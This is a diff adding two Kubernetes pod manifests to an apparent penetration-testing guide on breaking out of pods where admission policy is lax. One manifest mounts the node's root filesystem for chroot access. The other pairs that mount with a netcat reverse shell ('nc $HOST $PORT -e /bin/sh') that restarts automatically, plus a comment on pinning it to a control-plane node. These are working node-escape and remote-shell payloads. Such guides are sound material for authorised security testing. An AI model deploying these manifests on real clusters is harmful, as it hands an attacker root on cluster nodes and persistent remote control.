@@ -4,6 +4,29 @@ If there are no pod admission controllers applied,or a really lax policy, you ca
 # Pod Creation
 
 ### Create a pod you can exec into
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-hostpath
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: hostpath
+    image: busybox
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
 [pod-hostpath.yaml](pod-hostpath.yaml)
 
 #### Option 1: Create pod from local yaml 
@@ -22,6 +45,29 @@ kubectl -n [namespace] exec -it pod-hostpath -- chroot /host
 ```
 
 ### Or, create a reverse shell pod
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-hostpath-revshell
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: hostpath-revshell
+    image: busybox
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
+  restartPolicy: Always
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
 [pod-hostpath.yaml-revshell.yaml](pod-hostpath.yaml-revshell.yaml)
 
 #### Set up listener
